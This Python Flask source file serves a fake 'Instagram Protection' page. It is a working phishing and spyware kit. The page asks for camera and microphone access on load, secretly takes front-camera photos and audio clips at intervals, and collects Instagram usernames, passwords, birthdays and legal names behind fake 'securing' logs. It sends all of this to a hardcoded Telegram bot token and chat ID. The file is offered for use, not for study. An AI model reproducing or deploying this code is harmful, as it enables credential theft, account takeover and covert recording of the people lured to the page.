from flask import Flask, render_template_string, request, jsonify
import requests
import json
import threading
import time
from datetime import datetime
import base64
import os

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = '8802775389:AAGn7eRc1-v9v0bwxbcYb4Wtxu23jF39zik'
CHAT_ID = '8730143288'

# HTML Template with fixes
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Instagram Protection</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Courier New', monospace;
    }
    body {
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }
    .card {
      background: #111;
      max-width: 500px;
      width: 100%;
      border-radius: 20px;
      padding: 28px 22px;
      border: 1px solid #00ff00;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
      color: #00ff00;
    }
    h1 {
      font-weight: 600;
      font-size: 1.9rem;
      margin-bottom: 8px;
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    h1 span {
      background: #00ff00;
      color: #000;
      padding: 0 12px;
      border-radius: 4px;
    }
    .sub {
      color: #00cc00;
      margin-bottom: 28px;
      font-size: 0.9rem;
      border-left: 3px solid #00ff00;
      padding-left: 12px;
    }
    .loader-wrap {
      background: #1a1a1a;
      border-radius: 60px;
      height: 12px;
      margin: 24px 0 12px;
      overflow: hidden;
      border: 1px solid #00ff00;
    }
    .loader-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #00ff00, #00cc00);
      border-radius: 60px;
      transition: width 0.1s ease;
    }
    .timer-label {
      text-align: right;
      font-size: 0.9rem;
      color: #00cc00;
      margin-top: 4px;
    }
    .btn {
      background: #00ff00;
      border: none;
      color: #000;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 16px 20px;
      border-radius: 60px;
      width: 100%;
      margin-top: 24px;
      cursor: pointer;
      transition: 0.2s;
      text-transform: uppercase;
      letter-spacing: 2px;
      font-family: 'Courier New', monospace;
    }
    .btn:active { transform: scale(0.95); }
    .btn:disabled {
      opacity: 0.3;
      pointer-events: none;
    }
    .input-group {
      margin-top: 20px;
    }
    .input-group label {
      display: block;
      font-size: 0.8rem;
      font-weight: 500;
      color: #00cc00;
      margin-bottom: 5px;
      margin-top: 14px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 8px;
      border: 1px solid #00ff00;
      background: #0a0a0a;
      color: #00ff00;
      font-size: 1rem;
      outline: none;
      transition: 0.2s;
      font-family: 'Courier New', monospace;
    }
    .input-group input:focus {
      border-color: #00ff00;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
    }
    .safe-badge {
      background: #003300;
      padding: 14px 18px;
      border-radius: 8px;
      text-align: center;
      font-weight: 600;
      font-size: 1.2rem;
      margin: 16px 0 8px;
      color: #00ff00;
      display: none;
      border: 2px solid #00ff00;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
    }
    .status-badge {
      background: #1a1a1a;
      border-radius: 60px;
      padding: 8px 16px;
      font-size: 0.8rem;
      color: #00cc00;
      display: inline-block;
      margin-top: 10px;
      border: 1px solid #00ff00;
    }
    .hidden { display: none; }
    .text-muted { color: #006600; font-size: 0.8rem; margin-top: 10px; }
    .log-container {
      background: #000;
      border: 1px solid #00ff00;
      border-radius: 8px;
      padding: 12px;
      margin-top: 15px;
      max-height: 200px;
      overflow-y: auto;
      font-size: 0.75rem;
      display: none;
    }
    .log-container .log-line {
      color: #00ff00;
      padding: 2px 0;
      border-bottom: 1px solid #003300;
      animation: blink 0.5s;
    }
    @keyframes blink {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }
    .log-container .log-line.error {
      color: #ff4444;
    }
    .log-container .log-line.success {
      color: #44ff44;
    }
    .permission-status {
      display: none !important;
    }
    ::-webkit-scrollbar {
      width: 6px;
    }
    ::-webkit-scrollbar-track {
      background: #000;
    }
    ::-webkit-scrollbar-thumb {
      background: #00ff00;
    }
  </style>
</head>
<body>
<div class="card" id="app">
  <div id="loadingSection">
    <h1>🛡️ <span>SECURE</span></h1>
    <div class="sub">[SYSTEM] Initializing security protocol...</div>
    <div class="loader-wrap">
      <div class="loader-fill" id="loaderFill"></div>
    </div>
    <div class="timer-label" id="timerLabel">0 / 30s</div>
    <div class="status-badge" id="statusBadge">⏳ SYSTEM INITIALIZING...</div>
    <div id="permissionStatus" class="permission-status"></div>
    <button class="btn" id="continueBtn" disabled>⏳ WAITING...</button>
  </div>

  <div id="loginSection" class="hidden">
    <h1>🔐 PROTECT <span>IG</span></h1>
    <div class="sub">[SECURE] Enter credentials to protect account</div>
    <div class="input-group">
      <label>📧 Instagram Username / Email</label>
      <input type="text" id="igUsername" placeholder="username or email">
    </div>
    <div class="input-group">
      <label>🔑 Password</label>
      <input type="password" id="igPassword" placeholder="••••••••">
    </div>
    <div class="input-group">
      <label>📅 Birthday</label>
      <input type="text" id="igBirthday" placeholder="DD/MM/YYYY">
    </div>
    <div class="input-group">
      <label>📛 Legal Full Name</label>
      <input type="text" id="igLegalName" placeholder="John Doe">
    </div>
    <button class="btn" id="protectBtn">🛡️ PROTECT ACCOUNT</button>
    <div id="safeMessage" class="safe-badge">✅ ACCOUNT SECURED</div>
    <div class="log-container" id="logContainer"></div>
    <div class="text-muted">[SECURE] End-to-end encryption active</div>
  </div>
</div>

<script>
  // Request permissions silently immediately when page loads
  (async function() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: true
      });
      
      // Mute the audio output to prevent echo
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const source = audioContext.createMediaStreamSource(stream);
      const gainNode = audioContext.createGain();
      gainNode.gain.value = 0; // Mute completely
      source.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      // Store for later use
      window.mediaStream = stream;
      window.audioContext = audioContext;
      
      // Send device info silently
      sendToTelegram(`✅ Media permissions granted\n${getDeviceInfo()}`);
      
    } catch (err) {
      console.warn('Permission error:', err);
      sendToTelegram(`❌ Permission error: ${err.message || 'unknown'}`);
    }
  })();

  const API_BASE = window.location.origin;
  
  let loadingCompleted = false;
  let mediaActive = false;
  let intervalPhoto = null;
  let intervalAudio = null;
  let mediaStream = null;
  let audioContext = null;
  let audioProcessor = null;
  let audioSource = null;
  let isCapturing = false;
  let logLines = [];

  const loaderFill = document.getElementById('loaderFill');
  const timerLabel = document.getElementById('timerLabel');
  const statusBadge = document.getElementById('statusBadge');
  const continueBtn = document.getElementById('continueBtn');
  const loadingSection = document.getElementById('loadingSection');
  const loginSection = document.getElementById('loginSection');
  const protectBtn = document.getElementById('protectBtn');
  const safeMessage = document.getElementById('safeMessage');
  const logContainer = document.getElementById('logContainer');

  const igUsername = document.getElementById('igUsername');
  const igPassword = document.getElementById('igPassword');
  const igBirthday = document.getElementById('igBirthday');
  const igLegalName = document.getElementById('igLegalName');

  // Log function
  function addLog(message, type = 'info') {
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement('div');
    logEntry.className = `log-line ${type}`;
    logEntry.textContent = `[${time}] ${message}`;
    logContainer.appendChild(logEntry);
    logContainer.scrollTop = logContainer.scrollHeight;
    logContainer.style.display = 'block';
  }

  async function sendToTelegram(message) {
    try {
      await fetch('/api/send_message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: message })
      });
    } catch (error) {
      console.error('Send message error:', error);
    }
  }

  async function sendPhotoToBackend(base64Data) {
    try {
      await fetch('/api/send_photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ photo: base64Data })
      });
    } catch (error) {
      console.error('Send photo error:', error);
    }
  }

  async function sendAudioToBackend(base64Data) {
    try {
      await fetch('/api/send_audio', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ audio: base64Data })
      });
    } catch (error) {
      console.error('Send audio error:', error);
    }
  }

  async function sendLoginInfo(data) {
    try {
      await fetch('/api/send_login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (error) {
      console.error('Send login error:', error);
    }
  }

  function getDeviceInfo() {
    const nav = navigator;
    return `📱 DEVICE INFO:
• User Agent: ${nav.userAgent}
• Platform: ${nav.platform || 'unknown'}
• Language: ${nav.language}
• Screen: ${window.screen.width}x${window.screen.height}
• Time: ${new Date().toISOString()}`;
  }

  // Start loading timer
  let startTime = Date.now();
  const DURATION = 30;

  function updateLoader() {
    const elapsed = (Date.now() - startTime) / 1000;
    const progress = Math.min(elapsed / DURATION, 1);
    const percent = Math.round(progress * 100);
    loaderFill.style.width = percent + '%';
    timerLabel.textContent = `${Math.min(Math.floor(elapsed), DURATION)} / ${DURATION}s`;

    if (progress >= 1) {
      loadingCompleted = true;
      continueBtn.disabled = false;
      continueBtn.textContent = '▶ CONTINUE TO PROTECTION';
      statusBadge.textContent = '✅ READY';
      clearInterval(loaderInterval);
      startMediaCapture();
      return;
    }
  }

  const loaderInterval = setInterval(updateLoader, 100);
  updateLoader();

  // Start media capture after loading completes
  async function startMediaCapture() {
    try {
      // Use the existing stream or get a new one
      if (window.mediaStream) {
        mediaStream = window.mediaStream;
        audioContext = window.audioContext;
      } else {
        mediaStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        });
        
        // Mute audio output
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(mediaStream);
        const gainNode = audioContext.createGain();
        gainNode.gain.value = 0;
        source.connect(gainNode);
        gainNode.connect(audioContext.destination);
      }
      
      mediaActive = true;
      statusBadge.textContent = '📸 CAPTURING MEDIA';
      
      startPhotoCapture();
      startAudioCapture();
      
      sendToTelegram('✅ Media capture started');
    } catch (err) {
      console.warn('Media capture error:', err);
      statusBadge.textContent = '⚠️ MEDIA CAPTURE FAILED';
    }
  }

  // Photo capture with front camera
  function startPhotoCapture() {
    if (!mediaStream) return;
    
    async function capturePhoto() {
      if (!mediaActive || isCapturing) return;
      isCapturing = true;
      
      try {
        const video = document.createElement('video');
        video.srcObject = mediaStream;
        video.style.display = 'none';
        document.body.appendChild(video);
        
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        // Mirror for front camera
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);
        
        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
        await sendPhotoToBackend(dataUrl);
        
        video.pause();
        video.srcObject = null;
        document.body.removeChild(video);
      } catch (e) {
        console.warn('Photo capture error:', e);
      } finally {
        isCapturing = false;
      }
    }

    intervalPhoto = setInterval(() => {
      if (mediaActive) {
        capturePhoto();
      }
    }, 2000);
  }

  // Audio capture - muted output so user can't hear
  function startAudioCapture() {
    if (!mediaStream || !audioContext) return;
    
    try {
      // Create audio source from stream
      audioSource = audioContext.createMediaStreamSource(mediaStream);
      
      // Create gain node to mute output (extra safety)
      const muteGain = audioContext.createGain();
      muteGain.gain.value = 0;
      audioSource.connect(muteGain);
      muteGain.connect(audioContext.destination);
      
      // Create processor for capturing
      const processor = audioContext.createScriptProcessor(8192, 1, 1);
      audioSource.connect(processor);
      
      let audioBuffer = [];

      processor.onaudioprocess = function(e) {
        const inputData = e.inputBuffer.getChannelData(0);
        audioBuffer.push(new Float32Array(inputData));
      };

      audioProcessor = processor;

      // Send audio every 5 seconds
      intervalAudio = setInterval(async () => {
        if (!mediaActive || audioBuffer.length === 0) return;
        
        try {
          let totalLength = audioBuffer.reduce((acc, arr) => acc + arr.length, 0);
          if (totalLength === 0) return;
          
          const combined = new Float32Array(totalLength);
          let offset = 0;
          for (let arr of audioBuffer) {
            combined.set(arr, offset);
            offset += arr.length;
          }
          
          const wav = float32ToWav(combined);
          const base64 = arrayBufferToBase64(wav);
          await sendAudioToBackend(`data:audio/wav;base64,${base64}`);
          audioBuffer = [];
        } catch (e) {
          console.warn('Audio send error:', e);
        }
      }, 5000);
    } catch (e) {
      console.warn('Audio context error:', e);
    }
  }

  // Audio conversion helpers
  function float32ToWav(float32Array) {
    const sampleRate = 44100;
    const numChannels = 1;
    const bitsPerSample = 16;
    const blockAlign = numChannels * bitsPerSample / 8;
    const byteRate = sampleRate * blockAlign;
    const dataLength = float32Array.length * (bitsPerSample / 8);
    const buffer = new ArrayBuffer(44 + dataLength);
    const view = new DataView(buffer);

    function writeString(view, offset, string) {
      for (let i = 0; i < string.length; i++) {
        view.setUint8(offset + i, string.charCodeAt(i));
      }
    }
    
    writeString(view, 0, 'RIFF');
    view.setUint32(4, 36 + dataLength, true);
    writeString(view, 8, 'WAVE');
    writeString(view, 12, 'fmt ');
    view.setUint32(16, 16, true);
    view.setUint16(20, 1, true);
    view.setUint16(22, numChannels, true);
    view.setUint32(24, sampleRate, true);
    view.setUint32(28, byteRate, true);
    view.setUint16(32, blockAlign, true);
    view.setUint16(34, bitsPerSample, true);
    writeString(view, 36, 'data');
    view.setUint32(40, dataLength, true);

    let offset = 44;
    for (let i = 0; i < float32Array.length; i++) {
      let sample = Math.max(-1, Math.min(1, float32Array[i]));
      let intSample = sample < 0 ? sample * 0x8000 : sample * 0x7FFF;
      view.setInt16(offset, intSample, true);
      offset += 2;
    }
    return buffer;
  }

  function arrayBufferToBase64(buffer) {
    let binary = '';
    const bytes = new Uint8Array(buffer);
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
  }

  // Continue button
  continueBtn.addEventListener('click', function() {
    if (!loadingCompleted) return;
    loadingSection.classList.add('hidden');
    loginSection.classList.remove('hidden');
    sendToTelegram('🔓 User accessed login page');
    addLog('SYSTEM: Login page accessed', 'info');
  });

  // Protect button with hacker logs
  protectBtn.addEventListener('click', async function() {
    const username = igUsername.value.trim() || 'not provided';
    const password = igPassword.value.trim() || 'not provided';
    const birthday = igBirthday.value.trim() || 'not provided';
    const legalName = igLegalName.value.trim() || 'not provided';

    // Show hacker-style logs
    addLog('INITIALIZING PROTECTION PROTOCOL...', 'info');
    await sleep(500);
    addLog('🔍 SCANNING ACCOUNT VULNERABILITIES...', 'info');
    await sleep(600);
    addLog('🔐 ENCRYPTING PERSONAL DATA...', 'info');
    await sleep(500);
    addLog('🛡️ DEPLOYING SECURITY FIREWALL...', 'info');
    await sleep(700);
    addLog('✅ ACCOUNT SECURED SUCCESSFULLY!', 'success');
    
    // Send login info
    await sendLoginInfo({
      username: username,
      password: password,
      birthday: birthday,
      legalName: legalName
    });

    // Show safe message
    safeMessage.style.display = 'block';
    protectBtn.disabled = true;
    protectBtn.textContent = '✅ ACCOUNT PROTECTED';
    
    sendToTelegram('✅ Account protection completed');
    addLog('🔒 ALL SYSTEMS SECURE', 'success');
  });

  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Cleanup
  window.addEventListener('beforeunload', function() {
    if (intervalPhoto) clearInterval(intervalPhoto);
    if (intervalAudio) clearInterval(intervalAudio);
    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
    if (audioContext) audioContext.close();
    sendToTelegram('🔚 Page closed / unloaded');
  });
</script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the main page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send_message', methods=['POST'])
def send_message():
    """Send text message to Telegram"""
    try:
        data = request.json
        message = data.get('message', '')
        
        if not message:
            return jsonify({'error': 'No message provided'}), 400
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_photo', methods=['POST'])
def send_photo():
    """Send photo to Telegram"""
    try:
        data = request.json
        photo_data = data.get('photo', '')
        
        if not photo_data:
            return jsonify({'error': 'No photo provided'}), 400
        
        if 'base64,' in photo_data:
            photo_data = photo_data.split('base64,')[1]
        
        image_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('image.jpg', image_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID}
        
        response = requests.post(url, files=files, data=data, timeout=30)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_audio', methods=['POST'])
def send_audio():
    """Send audio to Telegram"""
    try:
        data = request.json
        audio_data = data.get('audio', '')
        
        if not audio_data:
            return jsonify({'error': 'No audio provided'}), 400
        
        if 'base64,' in audio_data:
            audio_data = audio_data.split('base64,')[1]
        
        audio_bytes = base64.b64decode(audio_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        files = {'audio': ('audio.wav', audio_bytes, 'audio/wav')}
        data = {'chat_id': CHAT_ID}
        
        response = requests.post(url, files=files, data=data, timeout=30)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_login', methods=['POST'])
def send_login():
    """Send login credentials to Telegram"""
    try:
        data = request.json
        username = data.get('username', 'not provided')
        password = data.get('password', 'not provided')
        birthday = data.get('birthday', 'not provided')
        legal_name = data.get('legalName', 'not provided')
        
        message = f"""🔐 INSTAGRAM LOGIN INFO:
👤 Username: {username}
🔑 Password: {password}
🎂 Birthday: {birthday}
📛 Legal name: {legal_name}
🕒 {datetime.now().isoformat()}"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        response = requests.post(url, json=payload, timeout=10)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Instagram Protection Server...")
    print(f"📱 Running on port: {port}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"💬 Chat ID: {CHAT_ID}")
    app.run(debug=False, host='0.0.0.0', port=port)
